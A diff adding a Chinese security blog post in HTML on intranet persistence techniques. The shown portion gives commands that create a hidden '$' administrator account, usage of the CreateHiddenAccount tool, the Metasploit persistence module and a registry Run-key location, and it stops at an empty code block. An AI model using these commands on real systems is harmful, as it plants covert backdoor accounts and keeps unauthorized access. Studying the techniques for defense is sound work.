@@ -1,0 +1,2401 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="内网权限维持思路总结">
+<title>内网权限维持技术</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="内网权限维持技术">
+<meta property='og:description' content="内网权限维持思路总结">
+<meta property='og:url' content='https://lserein.github.io/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-12T21:50:45&#43;08:00'/><meta property='article:modified_time' content='2025-09-12T22:11:44&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/logo.jpg' />
+<meta name="twitter:title" content="内网权限维持技术">
+<meta name="twitter:description" content="内网权限维持思路总结"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#11影子账号">1.1.影子账号</a></li>
+    <li><a href="#12注册表写入后门">1.2.注册表写入后门</a>
+      <ol>
+        <li><a href="#121使用msf的权限维持模块进行攻击"><strong>1.2.1.使用MSF的权限维持模块进行攻击</strong></a></li>
+        <li><a href="#122自己修改注册表进行攻击">1.2.2.自己修改注册表进行攻击</a></li>
+        <li><a href="#123cs-web投递攻击配合注册表写后门">1.2.3.CS Web投递攻击配合注册表写后门</a></li>
+      </ol>
+    </li>
+    <li><a href="#13计划任务后门">1.3.计划任务后门</a></li>
+    <li><a href="#14粘滞键后门">1.4.粘滞键后门</a></li>
+    <li><a href="#15黄金票据白银票据">1.5.黄金票据&amp;白银票据</a>
+      <ol>
+        <li><a href="#151黄金票据">1.5.1.黄金票据</a>
+          <ol>
+            <li><a href="#伪造黄金票据所需条件">伪造黄金票据所需条件</a></li>
+            <li><a href="#黄金票据的特点"><strong>黄金票据的特点</strong></a></li>
+            <li><a href="#使用mimikatz生成黄金票据">使用mimikatz生成黄金票据</a></li>
+            <li><a href="#黄金票据防御">黄金票据防御</a></li>
+          </ol>
+        </li>
+        <li><a href="#152白银票据"><strong>1.5.2.白银票据</strong></a>
+          <ol>
+            <li><a href="#伪造白银票据所需条件"><strong>伪造白银票据所需条件</strong></a></li>
+            <li><a href="#白银票据服务列表"><strong>白银票据服务列表</strong></a></li>
+            <li><a href="#使用mimikatz生成白银票据">使用mimikatz生成白银票据</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#16映像劫持">1.6.映像劫持</a></li>
+    <li><a href="#17屏幕保护后门"><strong>1.7.屏幕保护后门</strong></a></li>
+    <li><a href="#18服务自启动后门">1.8.服务自启动后门</a></li>
+    <li><a href="#19bitsadmin">1.9.bitsadmin</a></li>
+    <li><a href="#110windows的隐藏文件">1.10.Windows的隐藏文件</a></li>
+    <li><a href="#111windows权限维持小结"><strong>1.11.Windows权限维持小结</strong></a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#21添加账号">2.1.添加账号</a></li>
+    <li><a href="#22suid-shell">2.2.SUID Shell</a></li>
+    <li><a href="#23ssh公私钥登录">2.3.ssh公私钥登录</a></li>
+    <li><a href="#24定时任务crontab">2.4.定时任务Crontab</a></li>
+    <li><a href="#25strace后门">2.5.Strace后门（<strong>Linux-监控功能</strong>）</a></li>
+    <li><a href="#26openssh后门">2.6.OpenSSH后门</a></li>
+    <li><a href="#27ssh-pam后门">2.7.SSH PAM后门</a></li>
+    <li><a href="#28ssh-软连接">2.8.SSH 软连接</a></li>
+    <li><a href="#29alias别名后门">2.9.Alias别名后门</a></li>
+    <li><a href="#210">2.10.<strong>内核加载 LKM-Rootkit 后门</strong></a></li>
+    <li><a href="#211linux权限维持常用的一些技术手段">2.11.Linux权限维持常用的一些技术手段</a>
+      <ol>
+        <li><a href="#1修改文件或终端属性touch">1.修改文件或终端属性touch</a></li>
+        <li><a href="#2文件或文件夹加锁chattr">2.文件或文件夹加锁chattr</a></li>
+        <li><a href="#3history">3.History</a></li>
+      </ol>
+    </li>
+    <li><a href="#212linux权限维持小结">2.12.Linux权限维持小结</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#31php-webshell">3.1.Php WebShell</a></li>
+    <li><a href="#32python内存马">3.2.Python内存马</a></li>
+    <li><a href="#33java内存马">3.3.Java内存马</a></li>
+    <li><a href="#linux权限维持工具hackerpermkeeper使用">Linux权限维持工具&mdash;HackerPermKeeper使用</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/">
+                <img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/logo_hu_9068339753169ca4.jpg"
+                        srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/logo_hu_9068339753169ca4.jpg 800w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/logo_hu_95ed7e47d01b55e.jpg 1600w"
+                        width="800" 
+                        height="451" 
+                        loading="lazy"
+                        alt="Featured image of post 内网权限维持技术" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
+                内网安全
+            </a>
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/">内网权限维持技术</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            内网权限维持思路总结
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 12, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 17 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="1windows权限维持">1.Windows权限维持
+</h1><p><strong>参考资料：</strong><a class="link" href="https://download.csdn.net/blog/column/11793128/126533225#_65"  target="_blank" rel="noopener"
+    >内网渗透-windows权限维持的方法_内网渗透-CSDN专栏</a></p>
+<h2 id="11影子账号">1.1.影子账号
+</h2><p><a class="link" href="https://blog.csdn.net/2303_78851087/article/details/145974740"  target="_blank" rel="noopener"
+    >Windows权限维持之建立影子账号(五)_windows 7 创建影子账户-CSDN博客</a></p>
+<p><strong>影子账号可以行驶用户正常的权限和功能，并且只能在注册表中被检测到</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">net</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">hack$</span><span class="w"> </span><span class="n">Admin123</span><span class="w"> </span><span class="o">/</span><span class="n">add</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">net</span><span class="w"> </span><span class="n">localgroup</span><span class="w"> </span><span class="n">administrators</span><span class="w"> </span><span class="n">hack$</span><span class="w"> </span><span class="o">/</span><span class="n">add</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">添加账号需要管理员权限</span><span class="err">，</span><span class="n">不管是在域内还是工作组环境下都需要管理员权限</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/1.png"
+	width="1182"
+	height="414"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/1_hu_682a1204adcdceb9.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/1_hu_365e2858d554d9f6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="285"
+		data-flex-basis="685px"
+	
+></p>
+<p><strong>使用net user查看不到，但是在控制面版中可以看到，或者使用：wmic useraccount get Name</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/2.png"
+	width="789"
+	height="338"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/2_hu_28f82be4a07fcb19.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/2_hu_7d9ff2128db0f30b.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="560px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">wmic</span><span class="w"> </span><span class="n">useraccount</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">Name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">net</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">teamssix$</span><span class="w"> </span><span class="o">/</span><span class="n">del</span><span class="w">              </span><span class="c1">//删除用户命令</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>使用注册表修改账户，使隐藏账户只能通过注册表查看到，切换到影子账号下，然后打开注册表，将SAM的权限设置为管理员完全可控</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/3.png"
+	width="1565"
+	height="722"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/3_hu_70813f58e75d704c.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/3_hu_7d2f006ec3688080.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="520px"
+	
+></p>
+<p><strong>在注册表找到要修改的用户，Win10，Win2016以上账户无法展开注册表中的SAM，Win7以下可以</strong></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/4.png"
+	width="1438"
+	height="705"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/4_hu_ee1371495e97567e.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/4_hu_a9913f360e0809.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="489px"
+	
+></p>
+<p><a class="link" href="https://github.com/wgpsec/CreateHiddenAccount/r"  target="_blank" rel="noopener"
+    >https://github.com/wgpsec/CreateHiddenAccount</a>                 一键生成影子账号，需要在管理员权限下运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">createhiddenaccount</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w">      </span><span class="n">查看帮助</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="n">检查当前系统的隐藏账户</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">指定要删除的用户名</span><span class="err">，</span><span class="n">如果添加的用户名不是以</span><span class="w"> </span><span class="n">$</span><span class="w"> </span><span class="n">结尾</span><span class="err">，</span><span class="n">则工具会自动在用户名后添加上</span><span class="w"> </span><span class="n">$</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">指定添加的用户的密码</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">指定要添加的用户名</span><span class="err">，</span><span class="n">如果添加的用户名不是以</span><span class="w"> </span><span class="n">$</span><span class="w"> </span><span class="n">结尾</span><span class="err">，</span><span class="n">则工具会自动在用户名后添加上</span><span class="w"> </span><span class="n">$</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">例如这里添加一个用户名为</span><span class="w"> </span><span class="n">teamssix</span><span class="w"> </span><span class="n">的隐藏账号</span><span class="err">，</span><span class="n">工具会自动在用户名后添加</span><span class="w"> </span><span class="n">$</span><span class="w"> </span><span class="n">符</span><span class="err">，</span><span class="n">因此创建后的用户名为</span><span class="w"> </span><span class="n">teamssix$</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">使用的时候</span><span class="err">，</span><span class="n">记得在管理员权限下运行</span><span class="err">，</span><span class="n">不然会提示权限不足</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CreateHiddenAccount</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">teamssix</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">Passw0rd</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>创建完后，通过 net user 和控制面板等等都是看不到这个账号的，但是wmic还是可以查看到隐藏用户</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">CreateHiddenAccount</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w">                      </span><span class="n">查看隐藏账号</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CreateHiddenAccount</span><span class="p">.</span><span class="na">exe</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">teamssix</span><span class="w">             </span><span class="n">删除隐藏账号</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="12注册表写入后门">1.2.注册表写入后门
+</h2><p><a class="link" href="https://blog.csdn.net/weixin_57099902/article/details/137118773"  target="_blank" rel="noopener"
+    >应急响应实战笔记——权限维持篇：② Windows 权限维持&amp;后门篇-CSDN博客</a></p>
+<h3 id="121使用msf的权限维持模块进行攻击"><strong>1.2.1.使用MSF的权限维持模块进行攻击</strong>
+</h3><p><strong>MSF有对应的模块:exploit/windows/local/persistence</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">persistence</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/5.png"
+	width="1441"
+	height="447"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/5_hu_92375eabddd48bf1.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/5_hu_25169c146077d7f6.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="322"
+		data-flex-basis="773px"
+	
+></p>
+<p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/6.png"
+	width="1365"
+	height="837"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/6_hu_111effdaf5e626cd.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/6_hu_2b25982c618ba8b7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="391px"
+	
+></p>
+<h3 id="122自己修改注册表进行攻击">1.2.2.自己修改注册表进行攻击
+</h3><p><strong>都是需要先提权才能执行命令</strong></p>
+<p><font style="color:rgb(77, 77, 77);">位置一：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
